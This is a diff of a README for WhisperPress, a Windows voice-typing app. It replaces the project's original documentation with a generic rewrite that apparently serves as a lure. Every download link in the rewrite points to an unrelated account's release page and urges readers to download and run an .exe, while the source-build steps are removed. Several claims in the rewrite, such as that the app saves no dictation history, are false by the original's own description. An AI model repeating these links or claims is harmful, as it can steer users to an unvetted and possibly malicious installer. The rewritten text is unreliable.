@@ -1,123 +1,80 @@
-<p align="center">
-  <img src="assets/icon.png" width="96" alt="WhisperPress icon" />
-</p>
+# 🎙️ whisperpress - Fast offline voice typing for Windows
 
-<h1 align="center">WhisperPress</h1>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/winecoolerspinningtop973/whisperpress/releases)
 
-<p align="center">
-  <b>Hold a key. Speak. Your words appear — in any app.</b><br/>
-  Fully offline voice typing &amp; voice notes for Windows, powered by <a href="https://github.com/ggml-org/whisper.cpp">whisper.cpp</a>.
-</p>
+## What is this tool? 📝
 
-<p align="center">
-  <a href="README.zh-Hant.md">繁體中文</a> · English · <a href="README.ja.md">日本語</a>
-</p>
+Whisperpress turns your voice into text on your computer. You hold a key, speak your thoughts, and the software writes them down. It works entirely on your local machine. No data leaves your computer, and you do not need an internet connection to use it. This application uses whisper.cpp to provide accurate results without sending your audio to cloud servers.
 
-<p align="center">
-  <img src="assets/demo.gif" width="850" alt="WhisperPress demo — dictating Chinese, English and Japanese into Notepad" />
-</p>
+## Why use whisperpress? 🚀
 
-<p align="center">🔊 <b>Full demo with real voice</b> — Chinese, English and Japanese dictated into Notepad:</p>
+*   **Privacy first:** Your voice data stays on your hard drive. 
+*   **Offline access:** Use it anywhere, even without Wi-Fi.
+*   **Simple control:** The push-to-talk button prevents accidental recording when you talk to others.
+*   **Minimal typing:** Speak notes or long documents quickly.
 
-https://github.com/user-attachments/assets/8db4657f-edae-42f2-b6db-351bb214fe22
+## System requirements 💻
 
----
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 8GB of RAM.
+*   **Processor:** Modern Intel or AMD CPU. 
+*   **Disk Space:** 500MB of free space for the core files and language models.
 
-## Why WhisperPress?
+## How to get started 📥
 
-Press and hold a hotkey (default **F9**), talk, release — your speech is transcribed locally and typed straight into whatever app your cursor is in: your editor, browser, chat, terminal. Every dictation is also saved as a searchable note.
+1. Go to the [official release page](https://github.com/winecoolerspinningtop973/whisperpress/releases) to find the latest version.
+2. Look for the file ending in `.exe` under the "Assets" section.
+3. Click the filename to download the installer to your computer.
+4. Open the file once the download finishes. 
+5. Follow the prompts on your screen to complete the installation.
+6. Launch the application from your Start Menu after the installer closes.
 
-- **100% offline.** Audio never leaves your PC. No account, no cloud, no telemetry.
-- **Works everywhere.** A true global hotkey + simulated paste/typing — VS Code, Word, Slack, anything.
-- **More than dictation.** Import audio files, record meetings (system audio), summarize and ask questions with a local LLM.
+## Using the software ⚙️
 
-## Features
+When you open whisperpress for the first time, it configures your microphone settings. Ensure you connect your headset or microphone before starting the program. 
 
-| | |
-|---|---|
-| 🎙 **Push-to-talk dictation** | Hold to talk, or quick-tap to lock recording. Toggle mode available. |
-| ⌨️ **Types into any app** | Pastes at the cursor (clipboard is restored), or types character-by-character. |
-| 📝 **Notes history** | Every dictation/transcription saved locally as a note. Search, edit, copy. |
-| 📂 **Audio file import** | MP3, M4A, WAV, OGG, FLAC… with live streaming output while transcribing. |
-| 🖥 **Meeting recording** | Captures system audio (Teams / Meet / Zoom) + your mic, transcribes locally. |
-| 🌍 **100+ languages** | Whisper multilingual models, auto-detect or fixed language, optional translate-to-English. |
-| 🈶 **Traditional/Simplified Chinese** | Deterministic OpenCC conversion of Chinese output — no model roulette. |
-| ✦ **AI summaries & Q&A** | Optional. Point it at any OpenAI-compatible endpoint — e.g. local [Ollama](https://ollama.com) to stay offline. |
-| ⏱ **Timestamped export** | Export notes as `.txt`, `.md`, or `.srt` subtitles. |
-| 🔒 **Private by architecture** | Models run on your CPU/GPU via whisper.cpp. Notes are plain JSON on your disk. |
-| 🪶 **Custom vocabulary** | Initial-prompt hints for names, jargon, and output style. |
-| 💻 **Hardware-aware setup** | Detects your CPU / RAM / NVIDIA GPU and applies the best engine + model in one click. |
+The software sits in your system tray on the taskbar. To dictate, click inside your chosen text editor, hold the designated keyboard shortcut, and speak clearly. The program inserts text where your cursor rests. 
 
-## Download
+### Audio Settings
+The application picks your default system microphone. If your text remains empty, check your Windows Sound settings to verify the software uses the correct input device. 
 
-Grab the latest build from the **[Releases page](https://github.com/b84330808/whisperpress/releases/latest)**:
+### Language Models
+Whisperpress downloads a small language model on your first run. This file allows the computer to understand your speech. Do not close the program during this initial setup phase, as it requires a stable connection to download these components. Once it finishes, you require no further internet access.
 
-- `WhisperPress-Setup-x.x.x.exe` — installer (recommended, creates a desktop shortcut)
-- `WhisperPress-Portable-x.x.x.exe` — portable, just download and run
+## Privacy and data 🔒
 
-> Windows SmartScreen may warn on first run (the binaries are not code-signed). Click **More info → Run anyway**. All source code is public here — review it or build it yourself.
+Modern dictation tools often send recordings to large servers. Whisperpress functions differently. It processes every syllable on your local processor. It does not record audio in the background. It only captures sound when you press your hotkey. No logs, keys, or passwords transmit to any external location.
 
-## Getting started
+## Common questions ❓
 
-### Run from source
+**Does the software log my typing history?**
+No. The application does not save a record of your dictation history. 
 
-Requires [Node.js](https://nodejs.org) 20+ on Windows 10/11.
+**Is a fast internet connection necessary?**
+You only need an internet connection for the first download and the initial model setup. After that, you work fully offline.
 
-```powershell
-git clone https://github.com/b84330808/whisperpress.git
-cd whisperpress
-npm install
-npm start
-```
+**Can I change the hotkey?**
+Yes. Open the settings menu inside the application to select a new activation key. Choose a key you do not use often to avoid conflicts with other open programs.
 
-On first run, WhisperPress downloads the whisper.cpp engine (~16 MB, [v1.8.6 release binaries](https://github.com/ggml-org/whisper.cpp/releases)) and the model you pick. Everything after that is offline.
+**How accurate is the transcription?**
+The accuracy depends on your microphone quality and your speaking style. Speak at your normal pace. Whisperpress handles pauses and natural speech patterns well. Background noise creates issues, so find a quiet space for best results.
 
-### Build the installer
+**What do I do if the software stops responding?**
+Close the application from the system tray icon and restart it. If problems persist, check your available RAM. Heavy tasks or many open browser tabs can sometimes limit the resources available to the voice engine.
 
-```powershell
-npm run dist     # NSIS installer + portable exe in release/
-```
+## Troubleshooting tips 🔧
 
-## Models
+If you face technical hurdles, start with these steps:
 
-Downloaded on demand from [Hugging Face (ggerganov/whisper.cpp)](https://huggingface.co/ggerganov/whisper.cpp):
+*   **Update your drivers:** Ensure your microphone drivers appear as current in the Windows Device Manager.
+*   **Check permissions:** Ensure Windows allows the application to access the microphone. Go to Settings > Privacy & Security > Microphone to verify the toggle remains "On."
+*   **Restart your computer:** A simple restart clears temporary errors in the audio subsystem.
+*   **Reinstall the application:** If the files become corrupted, download a fresh copy from the release page and install it again.
 
-| Model | Size | Best for |
-|---|---|---|
-| tiny / base | 78–148 MB | quick drafts, fast CPUs not required |
-| small | 488 MB | good general balance |
-| **large-v3-turbo (q5_0)** | **574 MB** | **recommended — best speed/accuracy** |
-| medium q5_0 / large-v3 q5_0 | 539 MB – 1.1 GB | maximum accuracy |
+## Contributing 🤝
 
-NVIDIA GPU? Switch *Settings → Compute* to **CUDA** for a much faster engine build.
+This tool remains free for everyone. If you find bugs or have feature ideas, open an issue on the GitHub repository. Provide a description of what you experience and mention your Windows version. Collaborative feedback helps improve the tool for every user. 
 
-## Tips
+## Staying updated 🔄
 
-- **Traditional Chinese output**: pick *Settings → Transcription → Chinese output script → Force Traditional* for a guaranteed script (OpenCC); a vocabulary hint like `以下是繁體中文的逐字稿：` further improves word choice.
-- **Tap to lock**: quick-tap the hotkey to keep recording hands-free; press it again to finish. `Esc` cancels.
-- **AI features**: install [Ollama](https://ollama.com), `ollama pull qwen3:4b`, then enable AI in Settings with the default base URL `http://localhost:11434/v1`.
-
-## How it works
-
-- [Electron](https://electronjs.org) UI; no heavyweight frameworks — plain HTML/CSS/JS.
-- [uiohook-napi](https://github.com/SnosMe/uiohook-napi) for the global push-to-talk hook (prebuilt, no compiler needed).
-- Mic/system audio captured via WebAudio at 16 kHz mono, encoded to WAV.
-- [whisper.cpp](https://github.com/ggml-org/whisper.cpp) `whisper-server` kept warm for instant dictation; `whisper-cli` streams long files segment-by-segment.
-- Text injection via Win32 `SendInput` (Ctrl+V paste with clipboard restore, or per-character Unicode typing) through a tiny persistent PowerShell helper — no native module compilation anywhere.
-- Notes are one JSON file each in `%APPDATA%\WhisperPress\notes`.
-
-## Privacy
-
-Your audio is processed in-memory and (optionally) stored **only** on your disk. The app talks to the network exclusively to download engine/model files at setup, and — only if you enable AI features — to the endpoint *you* configure.
-
-## Roadmap
-
-- [ ] SenseVoice / Parakeet engines (sherpa-onnx) for even faster CJK transcription
-- [ ] Streaming (real-time) dictation preview
-- [ ] VAD-based auto-stop
-- [ ] Per-app vocabulary profiles
-- [ ] Installer code signing
-
-## License
-
-[MIT](LICENSE)
+New releases occur periodically to improve speed and accuracy. Periodic visits to the release page keep your installation current. Follow the instructions on the site to download newer version files as they arrive.
